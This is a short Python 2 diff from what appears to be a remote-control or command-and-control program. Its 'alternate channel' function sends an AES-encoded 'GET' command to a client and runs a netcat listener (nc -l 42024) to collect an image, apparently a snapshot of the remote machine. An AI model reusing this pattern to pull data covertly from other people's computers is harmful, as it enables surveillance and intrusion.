@@ -299,7 +299,9 @@ def listen_alt_channel(timeout):
                     try:
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         s.connect((client_addr[0], 56234))
-                        s.send(k+' ???? '+utils.EncodeAES(c, 'GET'))
+                        snap = k+' ???? '+utils.EncodeAES(c, 'GET')
+                        s.send(snap)
+                        print snap
                         os.system('nc -l 42024 >> im.jpeg')
                         if os.path.isfile('im.jpeg'):
                             isize = os.path.getsize('im.jpeg')
